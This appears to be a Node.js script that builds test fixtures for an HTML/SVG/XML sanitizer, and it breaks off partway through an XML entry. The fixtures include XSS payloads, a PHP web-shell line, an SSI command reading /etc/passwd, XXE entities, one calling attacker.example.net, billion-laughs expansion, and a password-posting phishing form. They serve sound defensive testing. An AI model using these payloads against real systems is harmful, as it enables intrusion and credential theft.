// Writes the crafted case fixtures in test/fixtures/cases and their manifest. Each fixture shows one problem, and a
// second run writes the same bytes. Usage: node scripts/make-fixtures.js
const fs = require('node:fs');
const path = require('node:path');

const dir = path.join(__dirname, '..', 'test', 'fixtures', 'cases');
fs.rmSync(dir, { recursive: true, force: true });
fs.mkdirSync(dir, { recursive: true });

const PNG = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';
const manifest = {};

/**
 * One fixture. `inspect` gives the status and the kinds its findings must include or leave out. `disarm` gives the
 * status, and text the output must hold or must not.
 */
function add(name, description, content, expect) {
  fs.writeFileSync(path.join(dir, name), typeof content === 'string' ? Buffer.from(content, 'utf8') : content);
  manifest[name] = { description, ...expect };
}

const page = body => `<!DOCTYPE html>\n<html>\n<head><meta charset="utf-8"><title>Case</title></head>\n<body>\n${body}\n</body>\n</html>\n`;

// ---------- HTML ----------

add(
  'html-clean.html',
  'A plain page: headings, a list, a table and a web link',
  page('<h1>Report</h1>\n<p>Text with <b>bold</b> &amp; an <a href="https://example.com/docs">example link</a>.</p>\n<ul><li>one<li>two</ul>\n<table><tr><td>a<td>b</table>'),
  {
    inspect: { status: 'clean', risk: 'NONE', includes: ['LINK/SAFE'] },
    disarm: { status: 'clean', present: ['<h1>Report</h1>', 'href="https://example.com/docs"', '&amp; an'] },
  },
);

add('html-script.html', 'Inline and external scripts', page('<script>document.write(1)</script>\n<script src="https://cdn.example.net/x.js"></script>\n<p>after</p>'), {
  inspect: { status: 'strippable', risk: 'HIGH', includes: ['SCRIPT/ELEMENT'] },
  disarm: { status: 'defused', absent: ['<script', 'document.write'], present: ['<p>after</p>'] },
});

add(
  'html-event-handlers.html',
  'Event handlers on body, img, svg and an unknown element, and an attribute that only starts like one',
  page('<img src="#" onerror="alert(1)">\n<svg onload="alert(2)"></svg>\n<x-widget onclick="alert(3)" online="yes">w</x-widget>\n<div onpointerrawupdate="alert(4)">d</div>'),
  {
    inspect: { status: 'strippable', includes: ['SCRIPT/EVENT_HANDLER'] },
    disarm: { status: 'defused', absent: ['onerror', 'onload', 'onclick', 'onpointerrawupdate', 'alert('], present: ['online="yes"'] },
  },
);

add(
  'html-javascript-urls.html',
  'javascript: and vbscript: URLs, written with character references, a tab and a named colon',
  page(
    '<a href="javascript:alert(1)">a</a>\n<a href="&#106;avascript:alert(2)">b</a>\n<a href="java&Tab;script:alert(3)">c</a>\n<a href="javascript&colon;alert(4)">d</a>\n<a href="  VBScript:msgbox(5)">e</a>\n<iframe src="javascript:alert(6)"></iframe>',
  ),
  {
    inspect: { status: 'strippable', includes: ['SCRIPT/URL', 'EMBEDDED/IFRAME'] },
    disarm: { status: 'defused', absent: ['javascript', 'vbscript', 'VBScript', 'alert(', 'msgbox'], present: ['<a>a</a>'] },
  },
);

add(
  'html-meta-refresh.html',
  'A meta refresh to another site, and a meta element that sets a cookie',
  page('<meta http-equiv="refresh" content="0; url=https://phish.example.org/login">\n<meta http-equiv="Set-Cookie" content="session=1">\n<p>moving</p>'),
  {
    inspect: { status: 'strippable', includes: ['NAVIGATION/REFRESH', 'NAVIGATION/SET_COOKIE'] },
    disarm: { status: 'defused', absent: ['refresh', 'Set-Cookie', 'phish'] },
  },
);

add(
  'html-relative-navigation.html',
  'Meta refreshes, a base address, an SVG use, a ping and a manifest at relative addresses, kept; refreshes a reader can take to another site, and relative paths written to read as other paths, removed',
  page(
    '<base href="docs/">\n<meta http-equiv="refresh" content="300">\n<meta http-equiv="refresh" content="5; url=\'next.html\'">\n<meta http-equiv="refresh" content="5;page2.html">\n<meta http-equiv="refresh" content="0; https://phish.example.org/a">\n<meta http-equiv="refresh" content="0; url=page.html;url=https://phish.example.org/b">\n<meta http-equiv="refresh" content="0; url=a/../../c.html">\n<svg><use href="icons.svg#home"/><use href="https://cdn.example.net/i.svg#x"/></svg>\n<a href="a.html" ping="/track click.php">a</a>',
  ).replace('<html>', '<html manifest="site.appcache">'),
  {
    inspect: {
      status: 'strippable',
      includes: ['NAVIGATION/RELATIVE_BASE', 'NAVIGATION/RELATIVE_REFRESH', 'NAVIGATION/REFRESH', 'NAVIGATION/PATH_TRICK', 'EXTERNAL/RELATIVE', 'SVG/USE_EXTERNAL'],
    },
    disarm: {
      status: 'defused',
      present: ['<base href="docs/">', 'content="300"', "url='next.html'", 'content="5;page2.html"', 'href="icons.svg#home"', 'ping="/track click.php"', 'manifest="site.appcache"'],
      absent: ['phish.example.org', 'c.html', 'cdn.example.net'],
    },
  },
);

add('html-base.html', 'A base element that moves every relative link', page('<base href="https://evil.example.net/">\n<a href="account/login">sign in</a>'), {
  inspect: { status: 'strippable', includes: ['NAVIGATION/BASE', 'LINK/RELATIVE'] },
  // The base goes, so the relative link stays and points beside the page again.
  disarm: { status: 'defused', absent: ['<base', 'evil.example.net'], present: ['href="account/login"'] },
});

add(
  'html-relative.html',
  'Relative links, images and a style sheet a web page uses, and relative paths written to read as other paths',
  page(
    '<a href="other.html">a</a>\n<a href="../up/page.html">b</a>\n<a href="/root/page.html?x=1#y">c</a>\n<img src="images/a.png">\n<img src="../img/b.png">\n<link rel="stylesheet" href="css/site.css">\n<a href="a/../../etc/passwd">t1</a>\n<a href="images\\..\\..\\x">t2</a>\n<img src="%2e%2e/%2e%2e/x.png">\n<a href=".../x">t3</a>',
  ),
  {
    inspect: { status: 'strippable', includes: ['LINK/RELATIVE', 'EXTERNAL/RELATIVE', 'LINK/PATH_TRICK', 'EXTERNAL/PATH_TRICK'] },
    disarm: {
      status: 'defused',
      present: ['href="other.html"', 'href="../up/page.html"', 'href="/root/page.html?x=1#y"', 'src="images/a.png"', 'src="../img/b.png"', 'href="css/site.css"'],
      absent: ['etc/passwd', '..\\..', '%2e%2e', '.../x'],
    },
  },
);

add(
  'html-frames.html',
  'An inline frame with srcdoc, a frame set, and a portal',
  page(
    '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">fallback</iframe>\n<frameset><frame src="https://example.net/a"><noframes>no frames</noframes></frameset>\n<portal src="https://example.net/p"></portal>',
  ),
  {
    inspect: { status: 'strippable', includes: ['EMBEDDED/IFRAME', 'EMBEDDED/FRAME'] },
    disarm: { status: 'defused', absent: ['<iframe', '<frame', '<frameset', '<portal', 'srcdoc'], present: ['no frames'] },
  },
);

add(
  'html-object-embed-applet.html',
  'An object with parameters and fallback content, an embed and an applet',
  page(
    '<object data="movie.swf" type="application/x-shockwave-flash"><param name="allowScriptAccess" value="always"><p>object fallback</p></object>\n<embed src="plugin.swf">\n<applet code="Evil.class"><p>applet fallback</p></applet>',
  ),
  {
    inspect: { status: 'strippable', risk: 'CRITICAL', includes: ['EMBEDDED/OBJECT', 'EMBEDDED/EMBED', 'EMBEDDED/APPLET'] },
    disarm: { status: 'defused', absent: ['<object', '<param', '<embed', '<applet', 'swf', 'Evil.class'], present: ['object fallback', 'applet fallback'] },
  },
);

add(
  'html-form-phish.html',
  'A login form that posts a password to another site, and a button with its own form action',
  page('<form action="https://collect.example.org/p" method="post"><input name="user"><input type="password" name="pass"><button formaction="https://collect.example.org/q">Go</button></form>'),
  {
    inspect: { status: 'strippable', includes: ['FORM/SUBMIT', 'FORM/PASSWORD'] },
    disarm: { status: 'defused', absent: ['<form', 'collect.example.org', 'formaction'], present: ['type="password"'] },
  },
);

add(
  'html-css.html',
  'Style sheets and style attributes that run or load: expression() also hidden by an escape and a comment, behavior, -moz-binding, a filter, @import and remote url()',
  page(
    '<style>\n@import url("https://evil.example.net/a.css");\n.a { width: expression(alert(1)); color: red }\n.b { width: \\65 xpression(alert(2)) }\n.c { width: exp/**/ression(alert(3)) }\n.d { behavior: url(x.htc) }\n.e { -moz-binding: url("x.xml#b") }\n.f { filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src="x.png") }\n.g { background: url(https://evil.example.net/b.png) }\n.h { background: url(#local) }\n@media print { .i { background: url("//evil.example.net/c.png") } }\n</style>\n<p style="color: blue; background-image: url(javascript:alert(4))">p</p>',
  ),
  {
    inspect: { status: 'strippable', includes: ['STYLE/IMPORT', 'STYLE/EXPRESSION', 'STYLE/BINDING', 'STYLE/REMOTE_URL', 'STYLE/ESCAPED', 'SCRIPT/URL'] },
    disarm: {
      status: 'defused',
      absent: ['@import', 'xpression', 'ression', 'behavior', 'binding', 'progid', 'evil.example.net', 'javascript'],
      present: ['color: red', 'url(#local)', 'color: blue', '@media print'],
    },
  },
);

add(
  'html-remote-resources.html',
  'Images, media, icons, style sheets and hints that load from elsewhere on their own',
  page(
    '<link rel="stylesheet" href="https://cdn.example.net/s.css">\n<link rel="icon" href="https://cdn.example.net/i.ico">\n<link rel="dns-prefetch" href="//tracker.example.net">\n<link rel="import" href="https://cdn.example.net/i.html">\n<img src="https://tracker.example.net/pixel.gif" srcset="https://tracker.example.net/2x.gif 2x">\n<video poster="https://cdn.example.net/p.jpg"><source src="https://cdn.example.net/v.mp4"><track src="https://cdn.example.net/t.vtt"></video>\n<table background="https://cdn.example.net/bg.png"><tr><td>x</table>\n<a href="https://example.com/" ping="https://tracker.example.net/ping">ok</a>\n<input type="image" src="https://cdn.example.net/b.png">',
  ),
  {
    inspect: { status: 'strippable', includes: ['EXTERNAL/STYLESHEET', 'EXTERNAL/RESOURCE', 'EXTERNAL/PREFETCH', 'EXTERNAL/IMPORT', 'LINK/SAFE'] },
    disarm: { status: 'defused', absent: ['cdn.example.net', 'tracker.example.net'], present: ['href="https://example.com/"'] },
  },
);

add(
  'html-network-paths.html',
  'Resources and links on network shares and local files, which can leak Windows credentials',
  page(
    '<img src="\\\\attacker.example.net\\share\\a.png">\n<img src="file://attacker.example.net/share/b.png">\n<img src="file:///C:/Windows/win.ini">\n<a href="file:///C:/Windows/System32/calc.exe">run</a>\n<a href="\\\\attacker.example.net\\share">share</a>',
  ),
  {
    inspect: { status: 'strippable', includes: ['EXTERNAL/NETWORK_PATH', 'EXTERNAL/LOCAL_FILE', 'LINK/FILE_URL', 'LINK/NETWORK_PATH'] },
    disarm: { status: 'defused', absent: ['attacker.example.net', 'file:', 'calc.exe'] },
  },
);

add(
  'html-links.html',
  'Links built to mislead or to start programs, beside a mail link and a link whose text agrees with it',
  page(
    '<a href="http://203.0.113.9/login">ip</a>\n<a href="https://bank.example.com@evil.example.net/">cred</a>\n<a href="https://xn--bnk-sna.example/">puny</a>\n<a href="https://%65vil.example.net/">enc</a>\n<a href="ms-msdt:/id PCWDiagnostic">tool</a>\n<a href="data:text/html,hello">data</a>\n<a href="https://evil.example.net/">https://bank.example.com</a>\n<a href="https://docs.example.com/x">docs.example.com</a>\n<a href="mailto:help@example.com">mail</a>',
  ),
  {
    inspect: {
      status: 'strippable',
      includes: ['LINK/IP_HOST', 'LINK/CREDENTIALS', 'LINK/LOOKALIKE_HOST', 'LINK/ENCODED_HOST', 'LINK/OTHER_SCHEME', 'LINK/DATA_URL', 'LINK/TEXT_MISMATCH', 'LINK/SAFE'],
    },
    disarm: { status: 'defused', absent: ['203.0.113.9', 'evil.example.net', 'ms-msdt', 'data:text', 'xn--'], present: ['href="https://docs.example.com/x"', 'href="mailto:help@example.com"'] },
  },
);

add(
  'html-conditional-comments.html',
  'A conditional comment that hides a script from every reader but Internet Explorer, and the markers of a revealed one',
  page('<!--[if IE]><script>alert(1)</script><![endif]-->\n<![if !IE]><p>others</p><![endif]>\n<!-- an ordinary comment -->'),
  {
    inspect: { status: 'strippable', includes: ['FORMAT/CONDITIONAL_COMMENT', 'SCRIPT/ELEMENT'] },
    disarm: { status: 'defused', absent: ['[if', 'endif', 'alert'], present: ['<p>others</p>', '<!-- an ordinary comment -->'] },
  },
);

add(
  'html-ssi.shtml',
  'Server-side include directives that run a command and pull in a file',
  page('<!--#exec cmd="cat /etc/passwd" -->\n<!--#include virtual="/private/config.txt" -->\n<p>page</p>'),
  {
    inspect: { status: 'strippable', includes: ['SERVER/SSI'] },
    disarm: { status: 'defused', absent: ['#exec', '#include', '/etc/passwd'], present: ['<p>page</p>'] },
  },
);

add(
  'html-esi.html',
  'Edge Side Includes, as an element written empty and as a comment, which a caching server runs, and a JSP action',
  page('<esi:include src="http://internal.example.net/admin"/>\n<!--esi <esi:vars>$(HTTP_COOKIE)</esi:vars> -->\n<jsp:include page="secret.jsp"/>\n<p>page text stays</p>'),
  {
    inspect: { status: 'strippable', includes: ['SERVER/ESI', 'SERVER/CODE'] },
    disarm: { status: 'defused', absent: ['esi:', 'internal.example.net', 'HTTP_COOKIE', 'jsp:'], present: ['<p>page text stays</p>'] },
  },
);

add('html-server-code.html', 'PHP and ASP code that a web server would run', page('<?php system($_GET["c"]); ?>\n<?= $secret ?>\n<% Response.Write("x") %>\n<p>page</p>'), {
  inspect: { status: 'strippable', includes: ['SERVER/CODE'] },
  disarm: { status: 'defused', absent: ['<?php', '<?=', '<%', 'system('], present: ['&lt;% Response.Write'] },
});

add('html-hta-element.html', 'A page that declares itself an HTML Application', page('<HTA:APPLICATION ID="app" APPLICATIONNAME="x" WINDOWSTATE="minimize"/>\n<p>runs with desktop rights</p>'), {
  inspect: { status: 'rejected', includes: ['FORMAT/HTA'] },
  disarm: { status: 'rejected' },
});

add(
  'xml-ebcdic.xml',
  'XML in EBCDIC with an external entity, which an XML reader that decodes EBCDIC reads, refused since xml-defuse does not decode it',
  Buffer.from(
    '4c6fa7949340a58599a28996957e7ff14bf07f6f6e254c5ac4d6c3e3e8d7c5409940ba4c5ac5d5e3c9e3e840a740e2e8e2e3c5d4407f868993857a61616185a383619781a2a2a6847f6ebb6e254c996e50a75e4c61996e25',
    'hex',
  ),
  {
    inspect: { status: 'rejected', includes: ['FORMAT/EBCDIC'] },
    disarm: { status: 'rejected' },
  },
);

add(
  'office-flat.fodt',
  'A flat OpenDocument text with a macro, an Office document saved as XML, which office-defuse reads',
  '<?xml version="1.0" encoding="UTF-8"?>\n<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" office:version="1.3" office:mimetype="application/vnd.oasis.opendocument.text"><office:scripts><office:script script:language="ooo:Basic"/></office:scripts><office:body><office:text/></office:body></office:document>\n',
  {
    inspect: { status: 'rejected', includes: ['FORMAT/OFFICE'] },
    disarm: { status: 'rejected' },
  },
);

add('html-named.hta', 'An ordinary page saved with the .hta extension, which mshta runs with desktop rights', page('<p>hello</p>'), {
  inspect: { status: 'rejected', includes: ['FORMAT/HTA'] },
  disarm: { status: 'rejected' },
});

add(
  'html-utf7.html',
  'A page that declares UTF-7, in which older Internet Explorer reads +ADw-script+AD4- as a script',
  '<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-7"></head><body>+ADw-script+AD4-alert(1)+ADw-/script+AD4-</body></html>',
  {
    inspect: { status: 'strippable', includes: ['FORMAT/UTF7'] },
    disarm: { status: 'defused', present: ['charset=utf-8'], absent: ['utf-7'] },
  },
);

add(
  'html-noscript.html',
  'A noscript element read two ways: with scripting on its text ends early and leaves an image with a handler; with scripting off it holds a remote image',
  page('<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p></noscript>\n<noscript><img src="https://tracker.example.net/n.gif"></noscript>'),
  {
    inspect: { status: 'strippable', includes: ['SCRIPT/EVENT_HANDLER', 'EXTERNAL/RESOURCE'] },
    disarm: { status: 'defused', absent: ['onerror', 'tracker.example.net', 'alert('] },
  },
);

add(
  'html-foreign-content.html',
  'Markup that leaves SVG and MathML for HTML, or switches between raw text and markup, as mutation XSS does',
  page(
    '<svg><style><img src=x onerror=alert(1)></style></svg>\n<math><mtext><table><mglyph><style><img src=x onerror=alert(2)></style></table></mtext></math>\n<svg><desc><style><img src=x onerror=alert(3)></style></desc></svg>\n<svg><foreignObject><iframe src="https://example.net/"></iframe></foreignObject></svg>',
  ),
  {
    inspect: { status: 'strippable', includes: ['SCRIPT/EVENT_HANDLER', 'SVG/FOREIGN_OBJECT'] },
    // The image that leaves SVG loses its handler and keeps its relative source. The other two images are style sheet
    // text, written with "<" as a CSS escape.
    disarm: { status: 'defused', absent: ['onerror=alert(1)', '<iframe', 'alert(1)'], present: ['\\3c img src=x onerror=alert(2)>', '\\3c img src=x onerror=alert(3)>'] },
  },
);

add(
  'html-raw-text.html',
  'Raw text elements whose text holds markup: kept as text, and escaped so an XML reader sees no tags either',
  page(
    '<xmp><b>shown as text</b></xmp>\n<textarea><script>not a script</script></textarea>\n<title>a <i>title</i></title>\n<style>/* <script>no</script> */ p { color: green }</style>\n<plaintext><img src=x onerror=alert(1)>',
  ),
  {
    inspect: { status: 'clean' },
    disarm: { status: 'clean', absent: ['<b>shown', '<script>', '<img src=x'], present: ['&lt;b>shown as text', '&lt;script&gt;not a script', '\\3c script>no'] },
  },
);

add(
  'html-script-escapes.html',
  'A script whose text holds <!-- and <script>, so it ends at a later </script> than a simple search finds',
  page('<script><!--\nvar s = "<script>"; // </script> is inside the double-escaped part\n--></script>\n<p>after the script</p>'),
  {
    inspect: { status: 'strippable', includes: ['SCRIPT/ELEMENT'] },
    disarm: { status: 'defused', absent: ['var s', 'double-escaped'], present: ['<p>after the script</p>'] },
  },
);

add(
  'html-shift-jis.html',
  'A Shift_JIS page whose meta element names its encoding',
  Buffer.concat([Buffer.from('<html><head><meta charset="shift_jis"><title>t</title></head><body><p>', 'latin1'), Buffer.from([0x93, 0xfa, 0x96, 0x7b]), Buffer.from('</p></body></html>', 'latin1')]),
  {
    inspect: { status: 'clean', encoding: 'shift_jis' },
    disarm: { status: 'clean', present: ['charset="utf-8"', '<p>\u65e5\u672c</p>'] },
  },
);

add('html-utf16.html', 'A UTF-16LE page with a byte order mark', Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from('<html><body><p>caf\u00e9</p><script>x</script></body></html>', 'utf16le')]), {
  inspect: { status: 'strippable', encoding: 'utf-16le', includes: ['SCRIPT/ELEMENT'] },
  disarm: { status: 'defused', present: ['<p>caf\u00e9</p>'] },
});

add(
  'html-windows-1252.html',
  'A page with bytes that are not UTF-8 and no declaration, read as windows-1252',
  Buffer.concat([Buffer.from('<html><body><p>', 'latin1'), Buffer.from([0x93, 0x63, 0x61, 0x66, 0xe9, 0x94]), Buffer.from('</p></body></html>', 'latin1')]),
  {
    inspect: { status: 'clean', encoding: 'windows-1252' },
    disarm: { status: 'clean', present: ['<p>\u201ccaf\u00e9\u201d</p>'] },
  },
);

add(
  'html-references.html',
  'Character references: legacy names without a semicolon, names an attribute keeps as written, and C1 numbers',
  page('<p>&amp &lt;x&gt; &copy 1 &#x80; &#150; &notin; &notit;</p>\n<a href="https://example.com/?a=1&amp;b=2&copy=3&notit=4">q</a>'),
  {
    inspect: { status: 'clean' },
    disarm: { status: 'clean', present: ['<p>&amp; &lt;x&gt; \u00a9 1 \u20ac \u2013 \u2209 \u00acit;</p>', 'href="https://example.com/?a=1&amp;b=2&amp;copy=3&amp;notit=4"'] },
  },
);

add(
  'html-data-urls.html',
  'Images and an icon in data: URLs, which are whole files for the plugins, and an SVG one that carries a script',
  page(
    `<img src="data:image/png;base64,${PNG}">\n<link rel="icon" href="data:image/png;base64,${PNG}">\n<img src="data:image/svg+xml;base64,${Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script><rect width="1" height="1"/></svg>').toString('base64')}">`,
  ),
  {
    inspect: { status: 'strippable', includes: ['EMBEDDED/NO_PLUGIN'] },
    disarm: { status: 'defused', absent: ['data:image'] },
  },
);

add('html-duplicate-attributes.html', 'A second href on one link, which every HTML reader drops', page('<a href="https://example.com/" href="javascript:alert(1)">x</a>'), {
  inspect: { status: 'clean' },
  disarm: { status: 'clean', absent: ['javascript'], present: ['href="https://example.com/"'] },
});

add('html-attribute-names.html', 'Attribute names that hold quotes, left by markup that closes a value twice', page('<img src="#" alt="a""onerror=alert(1)">\n<p>after</p>'), {
  inspect: { status: 'strippable', includes: ['PROCESSING/CONTENT_REMOVED'] },
  disarm: { status: 'defused', absent: ['onerror'], present: ['<p>after</p>'] },
});

add(
  'html-metadata.html',
  'Author and generator meta elements and comments, which only metadata stripping removes',
  page('<meta name="author" content="Someone">\n<meta name="generator" content="Editor 1.0">\n<!-- internal note -->\n<p>body</p>'),
  {
    options: { stripMetadata: true },
    inspect: { status: 'strippable', includes: ['METADATA/STRIPPED'] },
    disarm: { status: 'defused', absent: ['Someone', 'Editor 1.0', 'internal note'], present: ['<p>body</p>'] },
  },
);

// ---------- SVG ----------

const svg = (body, extra = '') =>
  `<?xml version="1.0" encoding="UTF-8"?>\n<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"${extra} width="10" height="10">\n${body}\n</svg>\n`;

add(
  'svg-clean.svg',
  'A drawing with a gradient referenced by fragment',
  svg('<defs><linearGradient id="g"><stop offset="0" stop-color="red"/></linearGradient></defs>\n<rect width="10" height="10" fill="url(#g)"/>'),
  {
    inspect: { status: 'clean', risk: 'NONE', format: 'svg' },
    disarm: { status: 'clean', present: ['fill="url(#g)"', '<linearGradient id="g">'] },
  },
);

add(
  'svg-script.svg',
  'An SVG script element, a CDATA script, an onload handler, a handler element and a javascript: link',
  svg(
    '<script type="text/javascript"><![CDATA[ alert(1) ]]></script>\n<handler type="application/ecmascript">alert(2)</handler>\n<a xlink:href="javascript:alert(3)"><text y="5">click</text></a>',
    ' onload="alert(4)"',
  ),
  {
    inspect: { status: 'strippable', risk: 'CRITICAL', format: 'svg', includes: ['SCRIPT/ELEMENT', 'SCRIPT/EVENT_HANDLER', 'SCRIPT/URL'] },
    disarm: { status: 'defused', absent: ['<script', '<handler', 'onload', 'javascript', 'alert('], present: ['<text y="5">click</text>'] },
  },
);

add(
  'svg-foreign-object.svg',
  'A foreignObject that holds an XHTML frame and script',
  svg('<foreignObject width="10" height="10"><div xmlns="http://www.w3.org/1999/xhtml"><iframe src="https://example.net/"></iframe><script>alert(1)</script></div></foreignObject>'),
  {
    inspect: { status: 'strippable', includes: ['SVG/FOREIGN_OBJECT', 'EMBEDDED/IFRAME', 'SCRIPT/ELEMENT'] },
    disarm: { status: 'defused', absent: ['foreignObject', 'iframe', 'script'] },
  },
);

add(
  'svg-use-external.svg',
  'use elements that copy from another file and from a data: URL',
  svg(`<use href="https://example.net/sprite.svg#icon"/>\n<use xlink:href="data:image/svg+xml;base64,${Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" id="x"/>').toString('base64')}#x"/>`),
  {
    inspect: { status: 'strippable', includes: ['SVG/USE_EXTERNAL'] },
    disarm: { status: 'defused', absent: ['<use', 'example.net'] },
  },
);

{
  let body = '<defs><g id="g0"><rect width="1" height="1"/><rect width="1" height="1"/><rect width="1" height="1"/><rect width="1" height="1"/><rect width="1" height="1"/></g>';
  for (let i = 1; i <= 9; i++) body += `<g id="g${i}">${`<use href="#g${i - 1}"/>`.repeat(10)}</g>`;
  body += '</defs><use href="#g9"/>';
  add('svg-use-amplification.svg', 'Nested use references that copy one group into billions of elements', svg(body), {
    inspect: { status: 'strippable', includes: ['SVG/USE_AMPLIFICATION'] },
    disarm: { status: 'defused', absent: ['<use'] },
  });
}

add(
  'svg-animate-href.svg',
  'Animations that set a link to a javascript: URL after the link was checked',
  svg(
    '<a href="#ok"><set attributeName="href" to="javascript:alert(1)"/><animate attributeName="xlink:href" values="#a;javascript:alert(2)" dur="1s"/><text y="5">x</text></a>\n<animate attributeName="opacity" from="0" to="1" dur="1s"/>',
  ),
  {
    inspect: { status: 'strippable', includes: ['SCRIPT/ANIMATION'] },
    disarm: { status: 'defused', absent: ['<set', 'javascript', 'xlink:href'], present: ['attributeName="opacity"'] },
  },
);

add(
  'svg-external-resources.svg',
  'An image, a filter image, a pattern reference and a fill that load from other files',
  svg(
    '<image href="https://cdn.example.net/a.png" width="5" height="5"/>\n<filter id="f"><feImage xlink:href="https://cdn.example.net/b.png"/></filter>\n<pattern id="p" href="https://cdn.example.net/c.svg#p"/>\n<rect width="1" height="1" fill="url(https://cdn.example.net/d.svg#g)"/>',
  ),
  {
    inspect: { status: 'strippable', includes: ['EXTERNAL/RESOURCE', 'STYLE/REMOTE_URL'] },
    disarm: { status: 'defused', absent: ['cdn.example.net'] },
  },
);

add(
  'svg-style.svg',
  'An SVG style sheet with @import and a remote background',
  svg('<style>@import url(https://cdn.example.net/x.css); rect { fill: blue; background: url(https://cdn.example.net/y.png) }</style><rect width="1" height="1"/>'),
  {
    inspect: { status: 'strippable', includes: ['STYLE/IMPORT', 'STYLE/REMOTE_URL'] },
    disarm: { status: 'defused', absent: ['@import', 'cdn.example.net'], present: ['fill: blue'] },
  },
);

add(
  'svg-w3c-doctype.svg',
  'The SVG 1.1 document type declaration, whose DTD is on www.w3.org',
  `<?xml version="1.0"?>\n<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">\n<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"/>\n`,
  {
    inspect: { status: 'clean', includes: ['XML/DOCTYPE'] },
    disarm: { status: 'clean', present: ['<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">'] },
  },
);

add(
  'svg-internal-entities.svg',
  'An internal subset whose entities give namespace URIs and text, as illustration tools write them',
  '<?xml version="1.0"?>\n<!DOCTYPE svg [\n<!ENTITY ns_svg "http://www.w3.org/2000/svg">\n<!ENTITY label "Hello">\n]>\n<svg xmlns="&ns_svg;" width="1" height="1"><text>&label;</text></svg>\n',
  {
    inspect: { status: 'strippable', includes: ['XML/INTERNAL_SUBSET'] },
    disarm: { status: 'defused', absent: ['ENTITY', '&ns_svg;', '&label;'], present: ['xmlns="http://www.w3.org/2000/svg"', '<text>Hello</text>'] },
  },
);

add(
  'svg-no-namespace.svg',
  'An svg element without its namespace, which only an HTML reader turns into a drawing',
  '<svg width="1" height="1"><script>alert(1)</script><a href="javascript:alert(2)"><text>x</text></a></svg>',
  {
    inspect: { status: 'strippable', format: 'html', includes: ['SCRIPT/ELEMENT', 'SCRIPT/URL'] },
    disarm: { status: 'defused', absent: ['<script', 'javascript'] },
  },
);

add(
  'svg-prefixed.svg',
  'SVG written with an svg: prefix, whose script element is a script by its namespace',
  '<?xml version="1.0"?>\n<svg:svg xmlns:svg="http://www.w3.org/2000/svg" width="1" height="1"><svg:script>alert(1)</svg:script><svg:rect width="1" height="1"/></svg:svg>\n',
  {
    inspect: { status: 'strippable', format: 'svg', includes: ['SCRIPT/ELEMENT'] },
    disarm: { status: 'defused', absent: ['svg:script', 'alert'], present: ['<svg:rect width="1" height="1"/>'] },
  },
);

add(
  'svg-comment-polyglot.svg',
  'An XML comment that an HTML reader ends at once, so the image with a handler inside it is markup to that reader',
  svg('<!--><img src=x onerror=alert(1)>--><rect width="1" height="1"/>'),
  {
    inspect: { status: 'strippable', includes: ['FORMAT/AMBIGUOUS_COMMENT'] },
    disarm: { status: 'defused', absent: ['onerror', '<img'] },
  },
);

add('svg-instruction-polyglot.svg', 'A processing instruction whose data holds ">", which ends it early for an HTML reader', svg('<?x a><img src=x onerror=alert(1)>?><rect width="1" height="1"/>'), {
  inspect: { status: 'strippable', includes: ['FORMAT/AMBIGUOUS_INSTRUCTION'] },
  disarm: { status: 'defused', absent: ['onerror', '<?x a'] },
});

// ---------- XML ----------

add('xml-external-entity.xml', 'An external entity that reads a local file into the content', '<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>\n<r>&x;</r>\n', {
  inspect: { status: 'strippable', format: 'xml', includes: ['XML/EXTERNAL_ENTITY', 'XML/INTERNAL_SUBSET'] },
  disarm: { status: 'defused', absent: ['ENTITY', '/etc/passwd', '&x;'], present: ['<r></r>'] },
});

add(
  'xml-external-parameter-entity.xml',
  'An external parameter entity, the out-of-band form of external entity attacks',
  '<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY % remote SYSTEM "http://attacker.example.net/x.dtd"> %remote;]>\n<r>data</r>\n',
  {
    inspect: { status: 'strippable', includes: ['XML/EXTERNAL_ENTITY', 'XML/INTERNAL_SUBSET'] },
    disarm: { status: 'defused', absent: ['ENTITY', 'attacker.example.net', '%remote'], present: ['<r>data</r>'] },
  },
);

add(
  'xml-entity-expansion.xml',
  'Ten levels of ten entity references each, which expand to a billion copies',
  `<?xml version="1.0"?>\n<!DOCTYPE lolz [\n<!ENTITY lol "lol">\n${Array.from({ length: 9 }, (_, i) => `<!ENTITY lol${i + 1} "${`&lol${i === 0 ? '' : i};`.repeat(10)}">`).join('\n')}\n]>\n<lolz>&lol9;</lolz>\n`,
  {
    inspect: { status: 'rejected', risk: 'UNKNOWN', includes: ['LIMIT/ENTITY_EXPANSIONS'] },
    disarm: { status: 'rejected' },
  },
);

add(
  'xml-entity-size.xml',
  'One large entity referenced many times, which expands to more text than the limit',
  `<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY big "${'x'.repeat(50000)}">]>\n<r>${'&big;'.repeat(400)}</r>\n`,
  {
    inspect: { status: 'rejected', risk: 'UNKNOWN', includes: ['LIMIT/ENTITY_SIZE'] },
    disarm: { status: 'rejected' },
  },
);

add(
  'xml-external-dtd.xml',
  'A document type declaration whose DTD a validating parser fetches from another server',
  '<?xml version="1.0"?>\n<!DOCTYPE r SYSTEM "http://attacker.example.net/r.dtd">\n<r/>\n',
  {
    inspect: { status: 'strippable', includes: ['XML/EXTERNAL_DTD'] },
    disarm: { status: 'defused', absent: ['attacker.example.net', 'SYSTEM'], present: ['<!DOCTYPE r>'] },
  },
);

add(
  'xml-xinclude.xml',
